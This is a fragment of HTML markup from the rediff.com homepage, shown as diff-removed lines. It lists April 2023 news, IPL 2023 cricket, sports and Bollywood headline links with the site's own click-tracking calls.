-                <h2 class="news" data-boxno="8_1-2_1" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Ftmc-leader-mukul-roy-is-untraceable-says-son%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/tmc-leader-mukul-roy-is-untraceable-says-son/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Ftmc-leader-mukul-roy-is-untraceable-says-son%2F20230418.htm___&position=8_1-2_1&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Mukul Roy in Delhi amid son's 'untraceable' claim</a>
-                </h2>
-                <h2 class="news" data-boxno="8_1-2_2" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2F17-arrested-with-ak-47s-machine-gun-over-us-gurdwara-shootings%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/17-arrested-with-ak-47s-machine-gun-over-us-gurdwara-shootings/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2F17-arrested-with-ak-47s-machine-gun-over-us-gurdwara-shootings%2F20230418.htm___&position=8_1-2_2&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">17 arrested with AK-47s over US gurdwara shootings</a>
-                </h2>
-                <h2 class="news" data-boxno="8_1-2_3" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwe-were-with-them-for-25-years-but-uddhav-on-bjp-after-cong-meet%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/we-were-with-them-for-25-years-but-uddhav-on-bjp-after-cong-meet/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwe-were-with-them-for-25-years-but-uddhav-on-bjp-after-cong-meet%2F20230418.htm___&position=8_1-2_3&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">We were with them for 25 years but...: Uddhav on BJP</a>
-                </h2>
-                <h2 class="news" data-boxno="8_1-2_4" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fsunstroke-at-maha-event-9-still-hospitalised%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/sunstroke-at-maha-event-9-still-hospitalised/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fsunstroke-at-maha-event-9-still-hospitalised%2F20230418.htm___&position=8_1-2_4&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Sunstroke at Maha event: 9 still hospitalised</a>
-                </h2>
-                <h2 class="news" data-boxno="8_1-2_5" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Findia-logs-7633-new-cases-active-cases-rise-to-61233%2F20230418.htm">
-                    <a href="https://www.rediff.com/news/report/india-logs-7633-new-cases-active-cases-rise-to-61233/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Findia-logs-7633-new-cases-active-cases-rise-to-61233%2F20230418.htm___&position=8_1-2_5&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">India logs 7,633 cases; active cases rise to 61,233</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/news" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews___&position=8_1-2_M&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">More News</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="8_3" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fsyeda-hameed-it-was-maulana-azad-who-set-up-iits-with-full-support-of-pandit-nehru%2F20230418.htm">
-                <p class="more">
-                    <a class="backnews" href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=8_3_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">news</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/news/2023/apr/16maulana-abul-kalam-azad.jpg" class="img" href="https://www.rediff.com/news/interview/syeda-hameed-it-was-maulana-azad-who-set-up-iits-with-full-support-of-pandit-nehru/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fsyeda-hameed-it-was-maulana-azad-who-set-up-iits-with-full-support-of-pandit-nehru%2F20230418.htm___&position=8_3_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">
-                        <img alt="'It was Maulana Azad who set up IITs'" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/news/interview/syeda-hameed-it-was-maulana-azad-who-set-up-iits-with-full-support-of-pandit-nehru/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fsyeda-hameed-it-was-maulana-azad-who-set-up-iits-with-full-support-of-pandit-nehru%2F20230418.htm___&position=8_3_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">'It was Maulana Azad who set up IITs'</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="8_4" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwho-is-this-ex-pm-blessing%2F20230418.htm">
-                <p class="more">
-                    <a class="backnews" href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=8_4_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">news</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/news/2023/apr/18nikhil-kumaraswamy-hd-deve-gowda1.jpg" class="img" href="https://www.rediff.com/news/report/who-is-this-ex-pm-blessing/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwho-is-this-ex-pm-blessing%2F20230418.htm___&position=8_4_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">
-                        <img alt="Who Is This Ex-PM Blessing?" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/news/report/who-is-this-ex-pm-blessing/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fwho-is-this-ex-pm-blessing%2F20230418.htm___&position=8_4_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">Who Is This Ex-PM Blessing?</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="8_5" data-track="label=edit_news&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Fspecial%2Fif-ncp-bjp-forms-govt-will-shinde-sing-bhajans%2F20230417.htm">
-                <p class="more">
-                    <a class="backnews" href="https://www.rediff.com/news" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news___&position=8_5_L&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">news</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/news/2019/nov/23ajitpawar.jpg" class="img" href="https://www.rediff.com/news/special/if-ncp-bjp-forms-govt-will-shinde-sing-bhajans/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Fspecial%2Fif-ncp-bjp-forms-govt-will-shinde-sing-bhajans%2F20230417.htm___&position=8_5_I&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">
-                        <img alt="'If NCP-BJP forms govt, will Shinde sing bhajans?'" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/news/special/if-ncp-bjp-forms-govt-will-shinde-sing-bhajans/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Fspecial%2Fif-ncp-bjp-forms-govt-will-shinde-sing-bhajans%2F20230417.htm___&position=8_5_T&label=edit_news&c_type=edit_news&property=hp_in_pc');return false;">'If NCP-BJP forms govt, will Shinde sing bhajans?'</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox ipl2023">
-                <h3>IPL 2023</h3>
-                <i class="clear"></i>
-                <h2 class="cricket" data-boxno="9_1-2_1" data-track="label=edit_ipl2023&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-whats-kohli-telling-dhoni%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-whats-kohli-telling-dhoni/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-whats-kohli-telling-dhoni%2F20230418.htm___&position=9_1-2_1&label=edit_ipl2023&c_type=edit_cricket&property=hp_in_pc');return false;">What's Kohli Telling Dhoni?</a>
-                </h2>
-                <h2 class="cricket" data-boxno="9_1-2_2" data-track="label=edit_ipl2023&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-csks-batters-targetting-200-plus-strike-rate-conway%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-csks-batters-targetting-200-plus-strike-rate-conway/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-csks-batters-targetting-200-plus-strike-rate-conway%2F20230418.htm___&position=9_1-2_2&label=edit_ipl2023&c_type=edit_cricket&property=hp_in_pc');return false;">CSK's batters targetting 200-plus strike rate: Conway</a>
-                </h2>
-                <h2 class="cricket" data-boxno="9_1-2_3" data-track="label=edit_ipl2023&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-csk-rcb-top-performers-33-sixes-conway-maxwell%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-csk-rcb-top-performers-33-sixes-conway-maxwell/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-csk-rcb-top-performers-33-sixes-conway-maxwell%2F20230418.htm___&position=9_1-2_3&label=edit_ipl2023&c_type=edit_cricket&property=hp_in_pc');return false;">Top Performers: 33 Sixes! Conway, Maxi</a>
-                </h2>
-                <h2 class="cricket" data-boxno="9_1-2_4" data-track="label=edit_ipl2023&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-csk-rcb-turning-point-dhonis-safe-gloves%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-csk-rcb-turning-point-dhonis-safe-gloves/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-csk-rcb-turning-point-dhonis-safe-gloves%2F20230418.htm___&position=9_1-2_4&label=edit_ipl2023&c_type=edit_cricket&property=hp_in_pc');return false;">Turning Point: Dhoni's Safe Gloves</a>
-                </h2>
-                <h2 class="cricket" data-boxno="9_1-2_5" data-track="label=edit_ipl2023&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-can-inconsistent-lucknow-super-giants-halt-rajasthan-royals-charge%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-can-inconsistent-lucknow-super-giants-halt-rajasthan-royals-charge/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-can-inconsistent-lucknow-super-giants-halt-rajasthan-royals-charge%2F20230418.htm___&position=9_1-2_5&label=edit_ipl2023&c_type=edit_cricket&property=hp_in_pc');return false;">Can inconsistent LSG halt Rajasthan Royals' charge?</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/cricket/ipl-2023" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Fipl-2023___&position=9_1-2_M&label=edit_ipl2023&c_type=edit_ipl2023&property=hp_in_pc');return false;">More IPL 2023</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="9_3" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Ftendulkars-in-the-spotlight-at-wankhede%2F20230417.htm">
-                <p class="more">
-                    <a class="backcricket" href="https://www.rediff.com/cricket" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=9_3_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">cricket</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/17ten1.jpg" class="img" href="https://www.rediff.com/cricket/report/tendulkars-in-the-spotlight-at-wankhede/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Ftendulkars-in-the-spotlight-at-wankhede%2F20230417.htm___&position=9_3_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">
-                        <img alt="Tendulkars In The Spotlight At Wankhede" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/cricket/report/tendulkars-in-the-spotlight-at-wankhede/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Ftendulkars-in-the-spotlight-at-wankhede%2F20230417.htm___&position=9_3_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">Tendulkars In The Spotlight At Wankhede</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="9_4" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fpoints-table-ipl-2023-mumbai-csk-gujarat-rcb-kkr-srh-delhi-royals-punjab-lsg%2F20230331.htm">
-                <p class="more">
-                    <a class="backcricket" href="https://www.rediff.com/cricket" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=9_4_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">cricket</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/17max.gif" class="img" href="https://www.rediff.com/cricket/report/points-table-ipl-2023-mumbai-csk-gujarat-rcb-kkr-srh-delhi-royals-punjab-lsg/20230331.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fpoints-table-ipl-2023-mumbai-csk-gujarat-rcb-kkr-srh-delhi-royals-punjab-lsg%2F20230331.htm___&position=9_4_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">
-                        <img alt="Points Table: IPL 2023" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/cricket/report/points-table-ipl-2023-mumbai-csk-gujarat-rcb-kkr-srh-delhi-royals-punjab-lsg/20230331.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fpoints-table-ipl-2023-mumbai-csk-gujarat-rcb-kkr-srh-delhi-royals-punjab-lsg%2F20230331.htm___&position=9_4_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">Points Table: IPL 2023</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="9_5" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Fspecial%2Fthe-ipl-2023-schedule%2F20230218.htm">
-                <p class="more">
-                    <a class="backcricket" href="https://www.rediff.com/cricket" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=9_5_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">cricket</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/16schedule1.jpg" class="img" href="https://www.rediff.com/cricket/special/the-ipl-2023-schedule/20230218.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Fspecial%2Fthe-ipl-2023-schedule%2F20230218.htm___&position=9_5_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">
-                        <img alt="The IPL 2023 Schedule" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/cricket/special/the-ipl-2023-schedule/20230218.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Fspecial%2Fthe-ipl-2023-schedule%2F20230218.htm___&position=9_5_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">The IPL 2023 Schedule</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox sports">
-                <h3>Cricket &Sports</h3>
-                <i class="clear"></i>
-                <h2 class="cricket" data-boxno="10_1-2_1" data-track="label=edit_cricketsports&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fwarner-gets-taylors-backing-for-wtc-ashes%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/warner-gets-taylors-backing-for-wtc-ashes/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fwarner-gets-taylors-backing-for-wtc-ashes%2F20230418.htm___&position=10_1-2_1&label=edit_cricketsports&c_type=edit_cricket&property=hp_in_pc');return false;">Warner gets Taylor's backing for WTC, Ashes</a>
-                </h2>
-                <h2 class="cricket" data-boxno="10_1-2_2" data-track="label=edit_cricketsports&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-how-csk-left-handers-made-the-difference-against-rcb%2F20230418.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-how-csk-left-handers-made-the-difference-against-rcb/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-how-csk-left-handers-made-the-difference-against-rcb%2F20230418.htm___&position=10_1-2_2&label=edit_cricketsports&c_type=edit_cricket&property=hp_in_pc');return false;">How CSK's left-handers made the difference vs RCB!</a>
-                </h2>
-                <h2 class="cricket" data-boxno="10_1-2_3" data-track="label=edit_cricketsports&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-back-among-the-runs-sky-puts-fans-at-ease%2F20230417.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-back-among-the-runs-sky-puts-fans-at-ease/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-back-among-the-runs-sky-puts-fans-at-ease%2F20230417.htm___&position=10_1-2_3&label=edit_cricketsports&c_type=edit_cricket&property=hp_in_pc');return false;">Back among the runs, SKY puts fans at ease</a>
-                </h2>
-                <h2 class="cricket" data-boxno="10_1-2_4" data-track="label=edit_cricketsports&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-there-will-never-be-a-captain-like-dhoni-gavaskar%2F20230417.htm">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-there-will-never-be-a-captain-like-dhoni-gavaskar/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-there-will-never-be-a-captain-like-dhoni-gavaskar%2F20230417.htm___&position=10_1-2_4&label=edit_cricketsports&c_type=edit_cricket&property=hp_in_pc');return false;">'There will never be a captain like Dhoni'</a>
-                </h2>
-                <h2 class="sports" data-boxno="10_1-2_5" data-track="label=edit_cricketsports&c_type=edit_sports&news=https%3A%2F%2Fwww.rediff.com%2Fsports%2Freport%2Fnovak-djokovic-struggling-with-elbow-issue-ahead-of-french-open%2F20230418.htm">
-                    <a href="https://www.rediff.com/sports/report/novak-djokovic-struggling-with-elbow-issue-ahead-of-french-open/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fsports%2Freport%2Fnovak-djokovic-struggling-with-elbow-issue-ahead-of-french-open%2F20230418.htm___&position=10_1-2_5&label=edit_cricketsports&c_type=edit_sports&property=hp_in_pc');return false;">The big worry for Djokovic ahead of French Open...</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/sports" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fsports___&position=10_1-2_M&label=edit_cricketsports&c_type=edit_cricketsports&property=hp_in_pc');return false;">More Cricket &Sports</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="10_3" data-track="label=edit_sports&c_type=edit_sports&news=https%3A%2F%2Fwww.rediff.com%2Fsports%2Freport%2Fr-madhavans-son-vedaant-wins-5-golds%2F20230417.htm">
-                <p class="more">
-                    <a class="backsports" href="https://www.rediff.com/sports" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/sports___&position=10_3_L&label=edit_sports&c_type=edit_sports&property=hp_in_pc');return false;">sports</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/sports/2023/apr/17maddy1.jpg" class="img" href="https://www.rediff.com/sports/report/r-madhavans-son-vedaant-wins-5-golds/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fsports%2Freport%2Fr-madhavans-son-vedaant-wins-5-golds%2F20230417.htm___&position=10_3_I&label=edit_sports&c_type=edit_sports&property=hp_in_pc');return false;">
-                        <img alt="R Madhavan's Son Vedaant Wins 5 Golds" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/sports/report/r-madhavans-son-vedaant-wins-5-golds/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fsports%2Freport%2Fr-madhavans-son-vedaant-wins-5-golds%2F20230417.htm___&position=10_3_T&label=edit_sports&c_type=edit_sports&property=hp_in_pc');return false;">R Madhavan's Son Vedaant Wins 5 Golds</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="10_4" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-pix-this-is-a-start-of-a-beautiful-journey-sachin-tendulkar-on-arjun-tendulkars-ipl-debut-mi%2F20230417.htm">
-                <p class="more">
-                    <a class="backcricket" href="https://www.rediff.com/cricket" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=10_4_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">cricket</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/16arjun-t.gif" class="img" href="https://www.rediff.com/cricket/report/ipl-pix-this-is-a-start-of-a-beautiful-journey-sachin-tendulkar-on-arjun-tendulkars-ipl-debut-mi/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-pix-this-is-a-start-of-a-beautiful-journey-sachin-tendulkar-on-arjun-tendulkars-ipl-debut-mi%2F20230417.htm___&position=10_4_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">
-                        <img alt="'This is a start of a beautiful journey...'" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/cricket/report/ipl-pix-this-is-a-start-of-a-beautiful-journey-sachin-tendulkar-on-arjun-tendulkars-ipl-debut-mi/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-pix-this-is-a-start-of-a-beautiful-journey-sachin-tendulkar-on-arjun-tendulkars-ipl-debut-mi%2F20230417.htm___&position=10_4_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">'This is a start of a beautiful journey...'</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="10_5" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-a-day-of-firsts-for-arjun-iyer-sky-duan%2F20230417.htm">
-                <p class="more">
-                    <a class="backcricket" href="https://www.rediff.com/cricket" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=10_5_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">cricket</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/16arjun-appeals.jpg" class="img" href="https://www.rediff.com/cricket/report/ipl-2023-a-day-of-firsts-for-arjun-iyer-sky-duan/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-a-day-of-firsts-for-arjun-iyer-sky-duan%2F20230417.htm___&position=10_5_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">
-                        <img alt="A Day Of Firsts For Arjun, Iyer, SKY!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/cricket/report/ipl-2023-a-day-of-firsts-for-arjun-iyer-sky-duan/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-a-day-of-firsts-for-arjun-iyer-sky-duan%2F20230417.htm___&position=10_5_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;">A Day Of Firsts For Arjun, Iyer, SKY!</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox movies">
-                <h3>Movies</h3>
-                <i class="clear"></i>
-                <h2 class="movies" data-boxno="11_1-2_1" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fwhen-madhuri-ate-vada-pav-with-tim-cook%2F20230418.htm">
-                    <a href="https://www.rediff.com/movies/report/when-madhuri-ate-vada-pav-with-tim-cook/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fwhen-madhuri-ate-vada-pav-with-tim-cook%2F20230418.htm___&position=11_1-2_1&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">When Madhuri Ate Vada Pav With Tim Cook</a>
-                </h2>
-                <h2 class="movies" data-boxno="11_1-2_2" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Fspecial%2Fsalman-khans-most-iconic-style-mantras%2F20230418.htm">
-                    <a href="https://www.rediff.com/movies/special/salman-khans-most-iconic-style-mantras/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Fspecial%2Fsalman-khans-most-iconic-style-mantras%2F20230418.htm___&position=11_1-2_2&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Salman Khan's Most Iconic Style Mantras</a>
-                </h2>
-                <h2 class="movies" data-boxno="11_1-2_3" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Ftanya-maniktala-its-so-amazing-i-get-to-roleplay-for-a-living%2F20230417.htm">
-                    <a href="https://www.rediff.com/movies/report/tanya-maniktala-its-so-amazing-i-get-to-roleplay-for-a-living/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Ftanya-maniktala-its-so-amazing-i-get-to-roleplay-for-a-living%2F20230417.htm___&position=11_1-2_3&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">The Suitable Girl Is Playing A Vampire!</a>
-                </h2>
-                <h2 class="movies" data-boxno="11_1-2_4" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fwill-kisi-ka-bhai-kisi-ka-jaan-be-a-superhit%2F20230417.htm">
-                    <a href="https://www.rediff.com/movies/report/will-kisi-ka-bhai-kisi-ka-jaan-be-a-superhit/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fwill-kisi-ka-bhai-kisi-ka-jaan-be-a-superhit%2F20230417.htm___&position=11_1-2_4&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Will Kisi Ka Bhai Kisi Ka Jaan Be A Hit?</a>
-                </h2>
